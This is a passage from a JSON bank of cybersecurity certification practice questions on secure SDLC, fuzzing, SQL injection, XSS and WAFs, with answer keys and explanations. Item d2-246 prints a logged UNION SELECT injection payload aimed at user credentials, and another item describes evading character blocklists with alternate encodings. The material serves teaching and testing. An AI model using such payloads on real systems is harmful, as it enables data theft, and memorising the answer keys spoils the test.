code.","l":"c8-appsec","l2":"","k":"static code analyzer Java"},{"id":"d2-205","set":"d2","ch":8,"d":2,"q":"Barney’s organization mandates fuzz testing for all applications before deploying them into production. Which one of the following issues is this testing methodology most likely to detect?","o":["Incorrect firewall rules","Unvalidated input","Missing operating system patches","Unencrypted data transmission"],"a":1,"e":"Fuzz testing works by dynamically manipulating input to an application in an effort to induce a flaw. This technique is useful for detecting places where an application does not perform proper input validation.","l":"c8-appsec","l2":"c8-sdlc","k":"fuzz testing unvalidated inputs"},{"id":"d2-206","set":"d2","ch":8,"d":2,"q":"Mia would like to ensure that her organization’s cybersecurity team reviews the architecture of a new ERP application that is under development. During which SDLC phase should Mia expect the security architecture to be completed?","o":["Requirements Analysis","Design","Implementation","Testing and Integration"],"a":1,"e":"Security architecture for a new ERP application should be completed during the design phase because that is when system components, data flows, trust boundaries, and controls are formally defined and integrated into the overall solution before coding begins. Requirements analysis focuses on gathering and documenting functional and nonfunctional needs, including high-level security requirements, but does not yet specify how those requirements will be implemented architecturally. Implementation is where developers write code and build components based on the existing design, so waiting until then to complete the security architecture would be too late and lead to costly rework. Testing and integration validate that the system behaves as intended and that controls operate correctly, but by that stage the architecture should already be in place, and only minor adjustments should be needed rather than foundational security design decisions.","l":"c8-sdlc","l2":"","k":"secure architecture design phase"},{"id":"d2-207","set":"d2","ch":8,"d":2,"q":"Which one of the following security activities is <i>not</i> normally a component of the Operations and Maintenance phase of the SDLC?\n<p><a href=\"#Que208\">Questions 208</a>–<a href=\"#Que210\">210</a> refer to the following scenario:</p>\n<p>Olivia has been put in charge of performing code reviews for her organization and needs to determine which code analysis models make the most sense based on specific needs her organization has.</p>","o":["Vulnerability scans","Disposition","Patching","Regression testing"],"a":1,"e":"Disposition is a separate SDLC phase that is designed to ensure that data is properly purged at the end of an application life cycle. Operations and maintenance activities include ongoing vulnerability scans, patching, and regression testing after upgrades.","l":"c8-sdlc","l2":"","k":"SDLC development phase boundaries"},{"id":"d2-208","set":"d2","ch":8,"d":2,"q":"Olivia’s security team has identified potential malicious code that has been uploaded to a webserver. If she wants to review the code without running it, what technique should she use?","o":["Dynamic analysis","Fagan analysis","Regression analysis","Static analysis"],"a":3,"e":"Olivia needs to review the code without running it, which means she needs to perform a static analysis. Static analysis is often performed with an automated tool, but her security analysts may also choose to review the code manually to identify potential details about the threat actors or what the code may have been specifically intended to do.","l":"c8-appsec","l2":"c3-filesandbox","k":"static code review analysis"},{"id":"d2-209","set":"d2","ch":8,"d":2,"q":"Olivia’s next task is to test the code for a new mobile application. She needs to test it by executing the code and intends to provide the application with input based on testing scenarios created by the development team as part of their design work. What type of testing will Olivia conduct?","o":["Dynamic analysis","Fagan analysis","Regression analysis","Static analysis"],"a":0,"e":"Dynamic analysis fits this situation because the mobile application is being executed and exercised with specific input scenarios to observe its runtime behavior and identify issues that occur during execution. Fagan analysis is a structured, formal code inspection process that reviews design or code artifacts without running the software, which does not align with her plan to execute the app. Regression analysis involves retesting previously tested functionality after changes are made to ensure that updates did not introduce new defects, which is not the focus of this discussion. Static analysis examines source code or binaries without executing them, typically using automated tools or manual review, which again conflicts with her intention to run the application with test inputs.","l":"c8-appsec","l2":"","k":"dynamic application security analysis"},{"id":"d2-210","set":"d2","ch":8,"d":2,"q":"After completing the first round of tests for her organization’s mobile application, Olivia has discovered indications that the application may not handle unexpected data well. What type of testing should she conduct if she wants to test it using an automated tool that will check for this issue?","o":["Fault injection","Fagan testing","Fuzzing","Failure injection"],"a":2,"e":"Fuzz testing involves sending random or invalid data to an application to test its ability to handle the unexpected data. Olivia should identify a fuzzer (a fuzz testing tool) and run it against the application.","l":"c8-appsec","l2":"","k":"fuzzing application error handling"},{"id":"d2-211","set":"d2","ch":7,"d":2,"q":"Which one of the following characters would not signal a potential security issue during the validation of user input to a web application?","o":["<code>&lt;</code>","<code>'</code>","<code>&gt;</code>","<code>$</code>"],"a":3,"e":"The <code>$</code> character does not necessarily represent a security issue. The greater than/less than brackets (<code>&lt;&gt;</code>) are used to enclose HTML tags and require further inspection to determine whether they are part of a cross-site scripting attack. The single quotation mark (<code>‘</code>) could be used as part of a SQL injection attack.","l":"c7-web-ot","l2":"c8-sdlc","k":"dangerous character input validation"},{"id":"d2-212","set":"d2","ch":8,"d":2,"q":"The Open Worldwide Application Security Project (OWASP) maintains a listing of the most important web application security controls. Which one of these items is <i>least</i> likely to appear on that list?","o":["Implement identity and authentication controls.","Implement appropriate access controls.","Obscure web interface locations.","Leverage security frameworks and libraries."],"a":2,"e":"Security through obscurity is not a good practice. You should not rely on the secrecy of the control (e.g., the location of the web interface) as a security measure. Therefore, obscuring web interface locations is not included on the OWASP security controls list.","l":"c8-sdlc","l2":"","k":"security through obscurity fallacy"},{"id":"d2-213","set":"d2","ch":8,"d":2,"q":"Kyle is developing a web application that uses a database backend. He is concerned about the possibility of a SQL injection attack against his application and is consulting the OWASP proactive security controls list to identify appropriate controls. Which one of the following OWASP controls is <i>least</i> likely to prevent a SQL injection attack?","o":["Parameterize queries.","Validate all input.","Encode data.","Implement logging and intrusion detection."],"a":3,"e":"Query parameterization, input validation, and data encoding are all ways to prevent the database from receiving user-supplied input that injects unwanted commands into a SQL query. Logging and intrusion detection are important controls, but they would detect, rather than prevent, a SQL injection attack.","l":"c8-sdlc","l2":"c7-web-ot","k":"SQL injection database defense"},{"id":"d2-214","set":"d2","ch":5,"d":2,"q":"Jill’s organization has adopted an asset management tool. If she wants to identify systems on the network based on a unique identifier per machine that will not normally change over time, which of the following options can she use for network-based discovery?","o":["IP address","Hostname","MAC address","None of the above"],"a":2,"e":"A machine’s MAC, or hardware, address, will not typically change over time. MAC addresses can also provide useful information like the manufacturer’s name, allowing Jill to have a useful guess about what type of device she has discovered during a discovery scan for asset tracking.","l":"c5-portscan","l2":"c6-requirements","k":"MAC address asset identification"},{"id":"d2-215","set":"d2","ch":7,"d":2,"q":"A scanner reports a critical vulnerability on a server. During review, the analyst discovers the vulnerable service is not installed on the host, and there is no matching software in the asset inventory. Leadership asks whether the issue should be escalated for emergency patching. What should the analyst do next?","o":["Escalate immediately.","Validate whether the finding is a false positive.","Ignore the finding.","Apply compensating controls and close the ticket."],"a":1,"e":"The analyst should validate whether the finding is a false positive, because the scanner reports a vulnerability in a service that does not appear to exist on the host or in the asset inventory, so confirming the presence or absence of the vulnerable software is necessary before triggering emergency patching. Escalating immediately assumes the vulnerability is real without verification and can waste resources or cause unnecessary change activity. Ignoring the finding skips due diligence and risks missing a real issue if the initial observations about installed software are incomplete. Applying compensating controls and closing the ticket presumes both that the vulnerability is real and that the controls are sufficient, which is premature when the fundamental question of whether the affected service is even present has not yet been answered.","l":"c7-validate","l2":"","k":"false positive finding validation"},{"id":"d2-216","set":"d2","ch":8,"d":2,"q":"Claire knows that a web application that her organization needs to have in production has vulnerabilities due to a recent scan using a web application security scanner. What is her best protection option if she knows that the vulnerability is a known SQL injection flaw?<p><a href=\"#Que217\">Questions 217</a>–<a href=\"#Que219\">219</a> refer to the following scenario:</p>\n<p>Donna has been assigned as the security lead for a DevSecOps team building a new web application. As part of the effort, she has to oversee the security practices that the team will use to protect the application.</p>","o":["A firewall","An IDS","A WAF","DLP"],"a":2,"e":"A web application firewall (WAF) can often be used to address the specific SQL injection attack. Claire can either write a rule based on the SQL injection attack or use a broader SQL injection prevention ruleset. An IDS would only detect the attack and would not stop it, whereas data loss prevention (DLP) tools might help if data was being stolen but won’t stop SQL injection. Some firewalls may have WAF functionality built in, but here the best option is the dedicated web application firewall.","l":"c8-controls","l2":"c7-web-ot","k":"WAF web application defense"},{"id":"d2-217","set":"d2","ch":8,"d":2,"q":"A member of Donna’s team recommends building a blocklist to avoid dangerous characters like <code>‘</code> and <code>&lt;script&gt;</code> tags. How could attackers bypass a blocklist that individually identified those characters?","o":["They can use a binary attack.","They can use alternate encodings.","They can use different characters with the same meaning.","The characters could be used together to avoid the blocklist."],"a":1,"e":"Using Unicode encoding to avoid blocklists is a common technique. OWASP recommends you avoid attempting to detect potentially dangerous characters and patterns of characters with a blocklist.","l":"c8-sdlc","l2":"c7-web-ot","k":"Unicode encoding filter evasion"},{"id":"d2-218","set":"d2","ch":6,"d":2,"q":"The design of the application calls for client-side validation of input. What type of tool could an attacker use to bypass this?","o":["An XSS injector","A web proxy","A JSON interpreter","A SQL injector"],"a":1,"e":"A web proxy is a commonly used tool for web application attacks and allows data to be changed after client-side validation. In general, client-side validation is not a secure technique because of this.","l":"c6-tools","l2":"c8-sdlc","k":"web interception proxy manipulation"},{"id":"d2-219","set":"d2","ch":7,"d":2,"q":"A member of Donna’s security team suggests that output encoding should also be considered. What type of attack is the team member most likely attempting to prevent?","o":["Cross-site scripting","SQL injection","Cross-site request forgery","All of the above"],"a":0,"e":"Cross-site scripting is the primary threat that is created by not using secure output encoding. Allowing users to enter arbitrary input and then displaying it to other users can result in a cross-site scripting attack. SQL injection is most common as a direct attack, whereas cross-site request forgery normally relies on users clicking a malicious link.","l":"c7-web-ot","l2":"c8-sdlc","k":"output encoding XSS defense"},{"id":"d2-220","set":"d2","ch":7,"d":2,"q":"Nathan downloads a BIOS/UEFI update from Dell’s website, and when he attempts to install it on the PC, he receives an error that the hash of the download does not match the hash stored on Dell’s servers. What type of protection is this?","o":["Full-disk encryption","Firmware protection","Operating system protection","None of the above"],"a":1,"e":"BIOS and UEFI are the firmware that controls system startup. In Dell’s implementation of this technology, a SHA-256 hash of the new firmware is compared to a known good hash on Dell’s servers. If an issue is detected, administrators are notified so that they can take appropriate action.","l":"c7-server-network","l2":"c2-os","k":"firmware protection mechanism"},{"id":"d2-221","set":"d2","ch":6,"d":2,"q":"A security analyst is asked to validate whether a web application is vulnerable to common web weaknesses and to review findings from a scanner that tests HTTP endpoints. The analyst needs a tool category that aligns to web application scanning rather than network mapping. Which tool is the best choice?","o":["Zed Attack Proxy (ZAP)","Angry IP Scanner","Nmap","Maltego"],"a":0,"e":"Zed Attack Proxy is the best fit because it is specifically designed as a web application security testing tool that interacts with HTTP and HTTPS endpoints to detect issues such as SQL injection, cross site scripting, and other OWASP-style weaknesses. Angry IP Scanner focuses on quickly discovering live hosts and open ports across IP ranges, which supports network mapping but not in-depth testing of web application logic or endpoint behavior. Nmap is a powerful network scanner that identifies hosts, services, and some basic vulnerabilities at the network and transport layers, yet it is not intended for detailed web application security assessment of HTTP endpoints. Maltego is primarily a link analysis and intelligence gathering tool used for mapping relationships between entities like domains, IPs, and people, rather than directly scanning and validating the security of web applications.","l":"c6-tools","l2":"c7-web-ot","k":"OWASP ZAP web scanner"},{"id":"d2-222","set":"d2","ch":8,"d":2,"q":"Valerie wants to prevent potential cross-site scripting attacks from being executed when previously entered information is displayed in user’s browsers. What technique should she use to prevent this?","o":["A firewall","A HIDS","Output encoding","String randomization"],"a":2,"e":"Output encoding translates special characters to an equivalent that will not be interpreted as part of a script or other significant character by a user’s browser (or other endpoint application). A HIDS would only alarm on potential attacks, rather than stop them; a firewall will not parse the data; and string randomization was made up for this question—but if it did exist, randomized data wouldn’t be useful in most applications when displaying input to a user.","l":"c8-sdlc","l2":"c7-web-ot","k":"output encoding character translation"},{"id":"d2-223","set":"d2","ch":7,"d":2,"q":"While developing a web application, Chris sets his session ID length to 128 bits based on OWASP’s recommended session management standards. What reason would he have for needing such a long session ID?","o":["To avoid duplication","To allow for a large group of users","To prevent brute-forcing","All of the above"],"a":2,"e":"OWASP recommends a large session ID value to avoid brute-force attacks. 2^128 is 340,282,366,920,938,463,463,374,607,431,768,211,456, a number that is far larger than you would need to avoid duplication of numbers, even for very large groups of users across the entire world. If you encounter a question like this and don’t know the answer, you can apply logic. In this case, the number is so large that it doesn’t make sense to use it for simply duplication avoidance, and any reasonable number of users—including the entire population of the world—would require fewer bits.","l":"c7-web-ot","l2":"c8-sdlc","k":"session identifier entropy strength"},{"id":"d2-224","set":"d2","ch":8,"d":2,"q":"Robert is reviewing a web application, and the developers have offered four different responses to incorrect logins. Which of the following four responses is the most secure option?","o":["Login failed for user; invalid password","Login failed; invalid user ID or password","Login failed; invalid user ID","Login failed; account does not exist"],"a":1,"e":"The answer that provides the least specific information to potential attackers is the best answer here: login failed; invalid user ID or password does not tell an attacker which option they have wrong or provide hints about which accounts may or may not exist.","l":"c8-sdlc","l2":"c7-web-ot","k":"generic authentication error messages"},{"id":"d2-225","set":"d2","ch":8,"d":2,"q":"Nathan is reviewing PHP code for his organization and finds the following code in the application he is assessing. What technique is the developer using?<p> </p>\n<pre><code>$stmt = $dbh-&gt;prepare(\"INSERT INTO REGISTRY (var1, var2) VALUES (:var1, :var2)\");</code>\n<code>$stmt-&gt;bindParam(':var1', $var1);</code>\n<code>$stmt-&gt;bindParam(':var2', $var2);</code>\n</pre>","o":["Dynamic binding","Parameterized queries","Variable limitation","None of the above"],"a":1,"e":"This code is an example of one way to parameterize queries. Here, the <code>var1</code> and <code>var2</code> variables are bound to specific data objects. In some cases, the CySA+ exam may show you examples of code or configurations that you may not be familiar with. In that case, you should read the example carefully for useful context like the statement <code>bindParam</code> here. That should give you a clue to the parameterized queries answer being the correct option.","l":"c8-sdlc","l2":"c7-web-ot","k":"parameterized queries implementation"},{"id":"d2-226","set":"d2","ch":10,"d":2,"q":"Christina wants to check the firmware she has been provided to ensure that it is the same firmware that the manufacturer provides. What process should she follow to validate that the firmware is trusted firmware?","o":["Download the same file from the manufacturer and compare file size.","Compare a hash of the file to a hash provided by the manufacturer.","Run strings against the firmware to find any evidence of tempering.","Submit the firmware to a malware scanning site to verify that it does not contain malware."],"a":1,"e":"The most effective means of checking most firmware to validate that it is a trusted firmware update is to compare the hash of the file that you have against the provided hash values from the manufacturer website.","l":"c10-analysis","l2":"c7-server-network","k":"firmware cryptographic hash verification"},{"id":"d2-227","set":"d2","ch":8,"d":2,"q":"What type of attack is the use of query parameterization intended to prevent?","o":["Buffer overflows","Cross-site scripting","SQL injection","Denial-of-service attacks"],"a":2,"e":"SQL injection is regularly rated as one of the top web application vulnerabilities, and parameterizing queries is an important way to help prevent it. Parameterized queries, or prepared statements, require developers to define the SQL code they will use, then pass in each parameter to the query. This prevents attackers from changing the intent of the query and allows the query to be used only as intended if properly implemented.","l":"c8-sdlc","l2":"c7-web-ot","k":"parameterized queries SQL injection prevention"},{"id":"d2-228","set":"d2","ch":8,"d":2,"q":"What type of attack is output encoding typically used to defend against?","o":["DoS","XSS","XML","DDoS"],"a":1,"e":"Output encoding is primarily used to defend against cross-site scripting (XSS) because it ensures that any user-supplied data rendered in a browser is treated as plaintext rather than executable HTML or JavaScript, preventing injected scripts from running. It is not a main control for denial-of-service attacks, which focus on overwhelming resources and are better addressed with rate limiting, filtering, and capacity planning. XML by itself is a data format, and while there are XML-specific attacks like XXE, those are mitigated through parser configuration and input validation rather than generic output encoding. Distributed denial of service is simply a larger-scale form of DoS using many sources, and again is handled with network and application-level protections rather than encoding output sent to clients.","l":"c8-sdlc","l2":"c7-web-ot","k":"output encoding XSS prevention"},{"id":"d2-229","set":"d2","ch":7,"d":2,"q":"Dory performs a vulnerability scan of her environment and two new findings are reported. The patch is available for both findings. Which finding should be prioritized <i>first</i> for remediation?<ul class=\"square\">\n<li>Finding A: CVSS is high, but the system is isolated in an offline lab network and has no active exploitation reported.</li>\n<li>Finding B: CVSS is moderate, EPSS is high, the server is external-facing, and threat intelligence indicates active exploitation.</li></ul>","o":["Neither A nor B should be prioritized.","Finding A.","Finding B.","Both A and B should be prioritized."],"a":2,"e":"Finding B should be addressed first because, despite its moderate CVSS score, it affects an external-facing server, has a high EPSS indicating a strong likelihood of exploitation, and is already being actively exploited according to threat intelligence, all of which significantly increase its real-world risk and urgency. The other finding affects a system isolated in an offline lab network with no reports of active exploitation. Even though its CVSS score is high, the actual exposure and likelihood of attack are much lower, making it a lower priority. Treating both findings as equal priorities would ignore the clear difference in exposure and active threat activity, and failing to prioritize either one would leave a known, actively exploited Internet-facing vulnerability unaddressed longer than necessary.","l":"c7-validate","l2":"c6-remediation","k":"external asset vulnerability prioritization"},{"id":"d2-230","set":"d2","ch":6,"d":2,"q":"A vulnerability scanner reports a potential remote code execution issue on a test web server. The analyst wants to validate the exploitability of the issue in a controlled lab environment and demonstrate the impact to stakeholders without building a custom exploit. Which tool would be most appropriate for this task?","o":["Angry IP Scanner","Metasploit Framework","Maltego","Burp Suite"],"a":1,"e":"Metasploit Framework is the best fit because it provides a large library of ready-made exploits and payloads that can be used in a controlled lab to validate whether a vulnerability is actually exploitable and to demonstrate impact, all without having to develop custom exploit code. Angry IP Scanner is primarily a fast host and port discovery tool and does not offer exploit modules or detailed vulnerability demonstration capabilities. Maltego is designed for link analysis and intelligence gathering, mapping relationships among entities such as IPs, domains, and people rather than actively exploiting vulnerabilities. Burp Suite focuses on web application testing and can help identify and manually probe web flaws, but it does not provide the same breadth of packaged, reusable exploit modules for remote code execution that a penetration testing framework like Metasploit offers.","l":"c6-tools","l2":"c1-endpoint-pentest","k":"Metasploit exploit verification"},{"id":"d2-231","set":"d2","ch":8,"d":2,"q":"A development team wants to identify insecure coding patterns (e.g., hardcoded secrets and unsafe functions) before code is deployed to production. The analyst must recommend a testing approach that examines the source code or build artifacts. Which method should the analyst recommend?","o":["DAST","BAS","SAST","SDLC"],"a":2,"e":"Static application security testing (SAST) fits this need because it examines source code or compiled artifacts without executing the application, allowing automated detection of insecure coding patterns such as hard-coded credentials, unsafe functions, and improper input handling before deployment. Dynamic application security testing (DAST) focuses on observing the application while it runs, typically via its interfaces, and therefore does not directly inspect source code for patterns in the same way. Breach and attack simulation (BAS) emulates attack techniques against live environments to test control effectiveness, not to scan code for insecure constructs during development. The software development life cycle (SDLC) is the overall process framework for building and maintaining software, and while security activities fit into it, it is not itself a testing method for analyzing code.","l":"c8-appsec","l2":"","k":"static application security testing"},{"id":"d2-232","set":"d2","ch":7,"d":2,"q":"The OWASP Session Management Cheatsheet advises that session IDs are meaningless and recommends that they should be used only as an identifier on the client side. Why should a session ID not have additional information encoded in it like the IP address of the client, their username, or other information?","o":["Processing complex session IDs will slow down the service.","Session IDs cannot contain this information for legal reasons.","Session IDs are sent to multiple different users, which would result in a data breach.","Session IDs could be decoded, resulting in data leakage."],"a":3,"e":"Session IDs should be associated with information needed by the application like userID, client IP address, session timeout and session start time information, or other details on the server side, typically in a session management database or repository. If the session ID had this information encoded in it, it could be reverse engineered and decoded, possibly resulting in data leakage. Complex session IDs are not a processing concern, unless there is sensitive information covered by law (which isn’t listed in the question), and then legal limitations would not apply. Session IDs are sent to the application and user whose session they belong to, so they would not breach data simply by being sent.","l":"c7-web-ot","l2":"c8-sdlc","k":"session cookie decoding risks"},{"id":"d2-233","set":"d2","ch":8,"d":2,"q":"Bounds checking, removing special characters, and forcing strings to match a limited set of options are all examples of what web application security technique?","o":["SQL injection prevention","Input validation","XSS prevention","Fuzzing"],"a":1,"e":"Input validation involves a variety of techniques, including checking the minimum and maximum range for numeric input, checking the length of input strings, removing special characters, and providing limited options for drop-down menus and other strings.","l":"c8-sdlc","l2":"","k":"comprehensive input validation methods"},{"id":"d2-234","set":"d2","ch":3,"d":2,"q":"Abigail is performing input validation against an input field and uses the following regular expression. What is she checking with the regular expression?<p> </p>\n<pre><code>^(AA|AE|AP|AL|AK|AS|AZ|AR|CA|CO|CT|DE|DC|FM|FL|GA|GU|</code>\n<code>HI|ID|IL|IN|IA|KS|KY|LA|ME|MH|MD|MA|MI|MN|MS|MO|MT|NE|</code>\n<code>NV|NH|NJ|NM|NY|NC|ND|MP|OH|OK|OR|PW|PA|PR|RI|SC|SD|TN|</code>\n<code>TX|UT|VT|VI|VA|WA|WV|WI|WY)$</code>\n</pre>","o":["She is removing all typical special characters found in SQL injection.","She is checking for all U.S. state names.","She is removing all typical special characters for cross-site scripting attacks.","She is checking for all U.S. state name abbreviations."],"a":3,"e":"This regular expression will match all U.S. state abbreviations, including military state codes and U.S. territories. Even if you’re not familiar with regular expressions, you may be asked to read unfamiliar code and determine what function it is performing. Here, reading the list should give you a good clue based on the two-letter pairings.","l":"c3-uba-scripting","l2":"c8-sdlc","k":"regular expression input validation"},{"id":"d2-235","set":"d2","ch":8,"d":2,"q":"Jennifer uses an application to send randomized data to her application to determine how it responds to unexpected input. What type of tool is she using?","o":["A UAT tool","A stress testing tool","A fuzzer","A regression testing tool"],"a":2,"e":"Fuzzers are tools that send unexpected input, testing whether an application can handle data that does not match what it expects. User acceptance testing (UAT) is a type of testing that helps to ensure that users can properly use a tool and that it performs the functions they expect. A stress testing tool typically puts very high loads onto an infrastructure or application to see how it performs when stressed. Regression testing is done to ensure that old flaws are not reintroduced to an application.","l":"c8-appsec","l2":"","k":"application fuzzer testing tool"},{"id":"d2-236","set":"d2","ch":8,"d":2,"q":"Greg wants to prevent SQL injection in a web application he is responsible for. Which of the following is <i>not</i> a common defense against SQL injection?","o":["Prepared statements with parameterized queries","Output validation","Stored procedures","Escaping all user-supplied input"],"a":1,"e":"Validating the output will not prevent SQL injection from occurring. Using prepared statements with parameterized queries, stored procedures, escaping all user-supplied input, input validation, and applying least privilege to the application and database accounts are all useful techniques to prevent successful SQL injection.","l":"c8-sdlc","l2":"c7-web-ot","k":"output validation SQLi limitation"},{"id":"d2-237","set":"d2","ch":7,"d":2,"q":"While reviewing code that generates a SQL query, Aarav notices that the “address” field is appended to the query without input validation or other techniques applied. What type of attack is most likely to be successful against code like this?\n<p><a href=\"#Que238\">Questions 238</a>–<a href=\"#Que240\">240</a> refer to the following scenario:</p>\n<p>Amanda has been assigned to lead the development of a new web application for her organization. She is following a standard SDLC model as shown here. Amanda’s first task is to determine if there are alternative solutions that are more cost effective than in-house development.</p>\n<figure><img alt=\"Diagram details 8 steps from A, B, Design, and Implementation through D, E, and Ongoing Operations and Maintenance to F.\" loading=\"lazy\" src=\"img/pt/c02un073.png\"/></figure>","o":["DoS","XSS","SQL injection","Teardrop"],"a":2,"e":"Unvalidated parameters in a SQL query are likely to allow SQL injection attacks. An attacker could inject arbitrary SQL code into that parameter, thus gaining additional access to the database and the data stored in it.","l":"c7-web-ot","l2":"c8-sdlc","k":"SQL injection code flaw"},{"id":"d2-238","set":"d2","ch":8,"d":2,"q":"What phase is Amanda in?","o":["Design","Operations and maintenance","Planning","Requirements analysis"],"a":2,"e":"She is in the planning phase because this is where feasibility and cost–benefit analyses occur, including evaluating alternatives such as purchasing or outsourcing instead of building the system in house. The design phase assumes the decision to develop the system has already been made and focuses on how the system will work, not whether it should be built at all. Operations and maintenance occur after the system is deployed and address ongoing support, updates, and improvements rather than initial solution selection. Requirements analysis concentrates on understanding and documenting what the system must do and the constraints it must meet, which generally follows the initial decision that a new or modified system is the preferred approach.","l":"c8-sdlc","l2":"","k":"SDLC planning phase feasibility"},{"id":"d2-239","set":"d2","ch":8,"d":2,"q":"What phase of the SDLC typically includes the first code analysis and unit testing in the process?","o":["Analysis and requirements definition","Design","Implementation","Testing and integration"],"a":2,"e":"Although it may seem like code analysis and unit testing should occur in the testing and integration phase, remember that unit testing occurs on individual program components, which means it will occur as the code is written. The same holds true for code analysis, and thus, the first time this happens will be in the implementation stage.","l":"c8-sdlc","l2":"c8-appsec","k":"SDLC implementation code analysis"},{"id":"d2-240","set":"d2","ch":8,"d":2,"q":"After making it through most of the SDLC process, Amanda has reached point E on the diagram. What occurs at point E?","o":["Disposition","Deployment","Unit testing","Testing and integration"],"a":1,"e":"Before an application can enter ongoing operations and maintenance, users must be trained and the application must be transitioned to the team that will maintain it for its life cycle. These activities occur during the deployment phase. Disposition occurs when a product or system hits the end of its life cycle. Unit testing is often part of the implementation phase. Testing and integration occur just before training and transition (point D).","l":"c8-sdlc","l2":"","k":"SDLC deployment phase acceptance"},{"id":"d2-241","set":"d2","ch":7,"d":2,"q":"Angela wants to prevent buffer overflow attacks on a Windows system. What two built-in technologies should she consider?","o":["The memory firewall and the stack guard","ASLR and DEP","ASLR and DLP","The memory firewall and the buffer guard"],"a":1,"e":"Windows has support for both data execution prevention (DEP) and address space location randomization (ASLR). These combine to help prevent buffer overflows by preventing items in memory location tagged as data from being executed and by randomizing the memory space Windows uses to make it harder to take advantage of known memory locations with an overflow.","l":"c7-server-network","l2":"c2-os","k":"ASLR and DEP buffer protection"},{"id":"d2-242","set":"d2","ch":8,"d":2,"q":"Amanda has been assigned to reduce the attack surface area for her organization, and she knows that the current network design relies on allowing systems throughout her organization to access the Internet directly via public IP addresses they are assigned. What should her first step be to reduce her organization’s attack surface quickly and without large amounts of time invested?","o":["Install host firewalls on the systems.","Move to a NAT environment.","Install an IPS.","None of the above."],"a":1,"e":"Moving to a network address translation (NAT) environment will make the systems inaccessible from the outside world, massively reducing the organization’s attack surface. Installing host firewalls would be a great second step but could involve significant amounts of work to install and tune the firewalls.","l":"c8-controls","l2":"c1-network","k":"NAT attack surface reduction"},{"id":"d2-243","set":"d2","ch":7,"d":2,"q":"Matt believes that developers in his organization deployed code that did not implement cookies in a secure way. What type of attack would be aided by this security issue?","o":["SQL injection","A denial-of-service attack","Session hijacking","XSS"],"a":2,"e":"Session hijacking of insecurely implemented session cookies is the likely result from this type of issue. Matt should spend time with his developers to ensure that they have reviewed resources like the OWASP guides to secure session creation and maintenance.","l":"c7-web-ot","l2":"","k":"insecure cookie session hijacking"},{"id":"d2-244","set":"d2","ch":8,"d":2,"q":"Chris operates the point-of-sale (POS) network for a company that accepts credit cards and is thus required to be compliant with PCI DSS. During his regular assessment of the POS terminals, he discovers that a recent Windows operating system vulnerability exists on all of them. Since they are all embedded systems that require a manufacturer update, he knows that he cannot install the available patch. What is Chris’s best option to stay compliant with PCI DSS and protect his vulnerable systems?","o":["Replace the Windows embedded point-of-sale terminals with standard Windows systems.","Build a custom operating system image that includes the patch.","Identify, implement, and document compensating controls.","Remove the POS terminals from the network until the vendor releases a patch."],"a":2,"e":"When a vulnerability exists and a patch has not been released or cannot be installed, compensating controls can provide appropriate protection. In the case of PCI DSS (and other compliance standards), documenting what compensating controls were put in place and making that documentation available is an important step for compliance.","l":"c8-governance","l2":"c6-remediation","k":"compensating control documentation"},{"id":"d2-245","set":"d2","ch":2,"d":2,"q":"Tracy is validating the web application security controls used by her organization. She wants to ensure that the organization is prepared to conduct forensic investigations of future security incidents. Which one of the following OWASP control categories is most likely to contribute to this effort?","o":["Implement logging.","Validate all inputs.","Parameterize queries.","Employ error and exception handling."],"a":0,"e":"Logging of application and server activity may provide valuable evidence during a forensic investigation. The other three controls listed are proactive controls designed to reduce the risk of an incident occurring and are less likely to directly provide information during a forensic investigation.","l":"c2-logging","l2":"c8-sdlc","k":"application activity logging controls"},{"id":"d2-246","set":"d2","ch":7,"d":2,"q":"While reviewing his Apache logs, Oscar discovers the following entry. What has occurred?<p> </p>\n<pre><code>10.1.1.1 - - [27/Jun/2023:11:42:22 -0500] \"GET</code>\n<code>/query.php?searchterm=stuff&amp;%20lid=1%20UNION%20SELECT%200,</code>\n<code>username,user_id,password,name,%20email,%20FROM%20users</code>\n<code>HTTP/1.1\" 200 9918 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0;</code>\n<code>Windows NT 5.1; SV1; .NET CLR 1.1.4322)\"</code>\n</pre>","o":["A successful database query","A PHP overflow attack","A SQL injection attack","An unsuccessful database query"],"a":2,"e":"This shows an attempted SQL injection attack. The query reads <code>1’ UNION SELECT 0</code> and then looks for username, user_id, password, name, and email from the <code>users</code> table.","l":"c7-web-ot","l2":"c3-tools","k":"SQL injection log signature"},{"id":"d2-247","set":"d2","ch":8,"d":2,"q":"Joan is working as a security consultant to a company that runs a critical web application. She discovered that the application has a serious SQL injection vulnerability, but the company cannot take the system offline during the 2 weeks required to revise the code. Which one of the following technologies would serve as the best compensating control?","o":["IPS","WAF","Vulnerability scanning","Encryption"],"a":1,"e":"Vulnerability scanning would not serve as a compensating control because it would only detect, rather than correct, security flaws. There is no indication that encryption is not in place on this server or that it would address a SQL injection vulnerability. Both an intrusion prevention system (IPS) and a web application firewall (WAF) have the ability to serve as a compensating control and block malicious requests. Of the two, a WAF would be the best solution in this case because it is purpose-built for protecting against the exploitation of web application vulnerabilities.","l":"c8-controls","l2":"c7-web-ot","k":"WAF compensating control implementation"},{"id":"d2-248","set":"d2","ch":5,"d":2,"q":"After conducting an <code>nmap</code> scan of his network from outside of his network, James notes that a large number of devices are showing three TCP ports open on public IP addresses: 9100, 515, and 631. What type of devices has he found, and how could he reduce his organization’s attack surface?","o":["Wireless access points, disable remote administration","Desktop workstations, enable the host firewall","Printers, move the printers to an internal-only IP address range","Network switches, enable encrypted administration mode"],"a":2,"e":"You may not remember every common TCP port, but you’ll want to make sure you have a good command of a few of them, including things like the LPR (515), IPP (631), and RAW (9100) ports common to many printers. Since these ports need to be open for printing services, the best option would be to move them to a protected subnet or IP range. RFC 1918 nonroutable IP addresses are often used for this purpose, but James may want to look into why devices like this are exposed to the Internet. He may have a deeper problem!","l":"c5-portscan","l2":"c8-controls","k":"printer network isolation"},{"id":"d2-249","set":"d2","ch":8,"d":2,"q":"Alex is working to understand his organization’s attack surface. Services, input fields in a web application, and communication protocols are all examples of what component of an attack surface evaluation?","o":["Threats","Attack vectors","Risks","Surface tension"],"a":1,"e":"Services, input fields, protocols, APIs, and other potential targets are all examples of attack vectors. Threats are possible dangers that might exploit a vulnerability, and risks are the exposure to loss or harm that results from breaches or attacks. Surface tension is a term from physics, not cybersecurity.","l":"c8-controls","l2":"","k":"attack vectors and attack surface"},{"id":"d2-250","set":"d2","ch":8,"d":2,"q":"Michelle wants to implement a static application security testing (SAST) tool into her continuous integration pipeline. What challenge could she run into if her organization uses multiple programming languages for components of their application stack that will be tested?","o":["They will have to ensure the scanner works with all of the languages chosen.","They will have to compile all of the code to the same binary output language.","They will have to run the applications in a sandbox.","They will have to run the applications under the same 